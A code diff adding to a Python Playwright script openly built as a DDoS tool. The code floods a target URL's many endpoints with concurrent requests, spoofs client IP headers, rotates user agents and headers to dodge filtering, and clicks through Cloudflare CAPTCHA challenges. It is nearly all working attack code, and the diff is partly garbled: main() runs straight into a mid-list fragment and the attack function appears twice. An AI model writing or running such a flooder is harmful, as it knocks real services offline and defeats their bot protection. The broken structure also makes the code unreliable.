@@ -200,6 +200,233 @@ async def ddos_attack(playwright, worker_id):
     phase_requests = 0
     max_phase_requests = 300000
 
+    try:
+        while time.time() - start_time < DURATION:
+            current_time = time.time()
+            if current_time - start_time > attack_phase * phase_duration:
+                attack_phase += 1
+                phase_requests = 0
+                print(f"Worker {worker_id}: Starting attack phase {attack_phase}")
+            
+            if phase_requests >= max_phase_requests:
+                await asyncio.sleep(0.1)
+                continue
+            
+            tasks = []
+            for _ in range(REQ_PER_LOOP):
+                endpoint = random.choice(DDOS_ENDPOINTS)
+                url = TARGET_URL.rstrip('/') + endpoint
+                headers = base_headers.copy()
+                headers["X-Request-ID"] = hashlib.md5(f"{worker_id}-{time.time()}-{random.random()}".encode()).hexdigest()
+                tasks.append(make_request_with_random_http_version(context, url, headers))
+                phase_requests += 1
+            
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            for res in results:
+                if isinstance(res, Exception):
+                    fail += 1
+                    status_count["exception"] = status_count.get("exception", 0) + 1
+                else:
+                    if res.ok:
+                        success += 1
+                        status_count[res.status] = status_count.get(res.status, 0) + 1
+                    else:
+                        fail += 1
+                        status_count[res.status] = status_count.get(res.status, 0) + 1
+            
+            await asyncio.sleep(random.uniform(0.01, 0.1))
+    except Exception as e:
+        print(f"Worker {worker_id} error: {str(e)}")
+    finally:
+        try:
+            await browser.close()
+        except:
+            pass
+
+async def main():
+    async with async_playwright() as p:
+        tasks = [ddos_attack(p, i) for i in range(CONCURRENCY)]
+        await asyncio.gather(*tasks)
+
+    total = success + fail
+    print(f"\n=== DDoS Attack Result ===")
+    print(f"Target URL: {TARGET_URL}")
+    print(f"Duration: {DURATION} seconds")
+    print(f"Concurrency: {CONCURRENCY}")
+    print(f"Requests per loop: {REQ_PER_LOOP}")
+    print(f"Total requests: {total}")
+    print(f"Success (2xx): {success}")
+    print(f"Fail/Blocked: {fail}")
+    print(f"Average RPS: {total / DURATION:.2f}")
+    print("Status breakdown:", status_count)
+
+if __name__ == "__main__":
+    asyncio.run(main())    "es-ES,es;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8"
+]
+
+HEADERS_POOL = [
+    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
+    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"},
+    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
+]
+
+DDOS_ENDPOINTS = [
+    "/", "/index.php", "/login", "/admin", "/search", "/api/v1/users", "/api/v2/data",
+    "/wp-admin/admin-ajax.php", "/wp-login.php", "/wp-json/wp/v2/posts", "/cgi-bin/test-cgi",
+    "/.env", "/config", "/upload", "/download", "/contact", "/about", "/products", "/cart",
+    "/checkout", "/user/profile", "/search?q=test", "/?s=test", "/api/data", "/rest/api",
+    "/graphql", "/api/auth/login", "/api/user/register", "/forum", "/blog", "/news",
+    "/gallery", "/video", "/audio", "/docs", "/help", "/support", "/faq", "/terms",
+    "/privacy", "/sitemap.xml", "/rss.xml", "/feed", "/atom.xml", "/opensearch.xml",
+    "/crossdomain.xml", "/clientaccesspolicy.xml", "/robots.txt", "/humans.txt",
+    "/favicon.ico", "/apple-touch-icon.png", "/apple-touch-icon-precomposed.png",
+    "/manifest.json", "/service-worker.js", "/offline.html", "/404", "/500", "/503",
+    "/maintenance", "/backup", "/tmp", "/temp", "/test", "/debug", "/dev", "/staging",
+    "/admin/login", "/admin/dashboard", "/admin/users", "/admin/settings", "/user/login",
+    "/user/register", "/user/profile", "/user/settings", "/api/v1/login", "/api/v1/register",
+    "/api/v1/profile", "/api/v1/settings", "/api/v2/login", "/api/v2/register",
+    "/api/v2/profile", "/api/v2/settings", "/api/v3/login", "/api/v3/register",
+    "/api/v3/profile", "/api/v3/settings",
+]
+
+def generate_fake_ip():
+    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+
+def encrypt_request_data(url, headers, body=None):
+    salt = os.urandom(16).hex()
+    data = {"url": url, "headers": headers, "body": body}
+    json_data = json.dumps(data)
+    encoded_data = base64.b64encode(json_data.encode()).decode()
+    final_data = f"{salt}.{encoded_data}"
+    return final_data
+
+def decrypt_request_data(encrypted_data):
+    try:
+        parts = encrypted_data.split(".", 1)
+        if len(parts) != 2:
+            return None
+        encoded_data = parts[1]
+        json_data = base64.b64decode(encoded_data).decode()
+        return json.loads(json_data)
+    except:
+        return None
+
+async def solve_captcha(page):
+    try:
+        captcha_selectors = [
+            'iframe[title*="CAPTCHA"]', 'iframe[src*="captcha"]', 'div[class*="captcha"]',
+            'div[id*="captcha"]', 'img[src*="captcha"]', 'img[alt*="captcha"]'
+        ]
+        captcha_found = False
+        for selector in captcha_selectors:
+            if await page.query_selector(selector):
+                captcha_found = True
+                break
+        if not captcha_found:
+            return True
+        if await page.query_selector('iframe[title*="Cloudflare"]'):
+            await asyncio.sleep(random.uniform(1, 3))
+            checkbox = await page.query_selector('input[type="checkbox"]')
+            if checkbox:
+                await checkbox.click()
+                await asyncio.sleep(random.uniform(1, 2))
+            try:
+                captcha_frame = await page.query_selector('iframe[title*="Cloudflare"]')
+                if captcha_frame:
+                    frame_box = await captcha_frame.bounding_box()
+                    x = frame_box['x'] + random.uniform(10, frame_box['width'] - 10)
+                    y = frame_box['y'] + random.uniform(10, frame_box['height'] - 10)
+                    await page.mouse.move(x, y)
+                    await asyncio.sleep(random.uniform(0.1, 0.5))
+                    await page.mouse.down()
+                    await asyncio.sleep(random.uniform(0.1, 0.3))
+                    await page.mouse.up()
+                    await asyncio.sleep(random.uniform(1, 2))
+            except:
+                pass
+        for _ in range(5):
+            if not await page.query_selector('iframe[title*="CAPTCHA"]'):
+                return True
+            await asyncio.sleep(1)
+        return False
+    except:
+        return True
+
+async def make_request_with_random_http_version(context, url, headers):
+    http_versions = ["http/1.0", "http/1.1", "h2", "http/3"]
+    http_version = random.choice(http_versions)
+    fake_ip = generate_fake_ip()
+    headers["X-Forwarded-For"] = fake_ip
+    headers["X-Real-IP"] = fake_ip
+    headers["X-Client-IP"] = fake_ip
+    headers["Cache-Control"] = random.choice(["no-cache", "no-store", "max-age=0"])
+    headers["Pragma"] = random.choice(["no-cache", ""])
+    headers["Connection"] = random.choice(["keep-alive", "close"])
+    headers["Accept-Encoding"] = random.choice(["gzip, deflate", "gzip, deflate, br", "identity"])
+    encrypted_data = encrypt_request_data(url, headers)
+    try:
+        if http_version == "http/1.0":
+            response = await context.request.get(url, headers=headers, timeout=10000)
+        elif http_version == "http/1.1":
+            response = await context.request.get(url, headers=headers, timeout=10000)
+        elif http_version == "h2":
+            response = await context.request.get(url, headers=headers, timeout=10000)
+        elif http_version == "http/3":
+            response = await context.request.get(url, headers=headers, timeout=10000)
+        return response
+    except:
+        return None
+
+success = 0
+fail = 0
+status_count = {}
+
+async def ddos_attack(playwright, worker_id):
+    global success, fail, status_count
+
+    ua = random.choice(USER_AGENTS)
+    lang = random.choice(ACCEPT_LANG)
+    base_headers = random.choice(HEADERS_POOL)
+    base_headers["Accept-Language"] = lang
+
+    browser = await playwright.chromium.launch(
+        headless=True,
+        args=[
+            "--disable-web-security", "--disable-features=IsolateOrigins,site-per-process",
+            "--disable-blink-features=AutomationControlled", "--no-sandbox",
+            "--disable-dev-shm-usage", "--disable-setuid-sandbox", "--disable-gpu",
+            "--disable-software-rasterizer", "--disable-extensions", "--disable-plugins",
+            "--disable-images", "--disable-javascript", "--disable-css", "--disable-default-apps",
+            "--disable-background-timer-throttling", "--disable-renderer-backgrounding",
+            "--disable-backgrounding-occluded-windows", "--disable-client-side-phishing-detection",
+            "--disable-popup-blocking", "--disable-prompt-on-repost", "--disable-component-update",
+            "--disable-domain-reliability", "--disable-features=TranslateUI",
+            "--disable-ipc-flooding-protection", "--disable-logging", "--disable-notifications",
+            "--disable-permissions-api", "--disable-popup-blocking", "--disable-presentation-api",
+            "--disable-remote-debugging-port", "--disable-sync", "--disable-web-security",
+            "--disable-wake-on-wifi", "--enable-automation", "--enable-blink-features=ShadowDOM",
+            "--enable-features=NetworkService", "--enable-features=NetworkServiceInProcess",
+            "--force-color-profile=srgb", "--metrics-recording-only", "--no-first-run",
+            "--no-default-browser-check", "--disable-default-apps"
+        ]
+    )
+    
+    context = await browser.new_context(
+        user_agent=ua,
+        ignore_https_errors=True,
+        java_script_enabled=False
+    )
+
+    start_time = time.time()
+    attack_phase = 0
+    phase_duration = 5
+    phase_requests = 0
+    max_phase_requests = 300000
+
     while time.time() - start_time < DURATION:
         current_time = time.time()
         if current_time - start_time > attack_phase * phase_duration:
